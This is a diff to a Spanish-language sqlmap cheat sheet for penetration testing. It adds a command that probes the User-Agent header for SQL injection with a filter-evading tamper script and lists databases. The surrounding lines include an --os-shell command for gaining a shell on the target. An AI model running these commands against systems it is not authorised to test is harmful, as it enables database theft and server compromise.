@@ -45,6 +45,11 @@ sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --d
 sqlmap -u "<URL>" --cookie="<Cookie-Value>" --os-shell
 ```
 
+#### Listar BD, usando un parámetro de 'User-Agent' con el método GET
+```
+sqlmap -u '<URL>' -p User-Agent --method=GET --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --dbs
+```
+
 #### Colocar un parámetro y usar la técnica de UNION
 ```
 sqlmap -u "<URL>" -p <PARAMETER> --technique=U
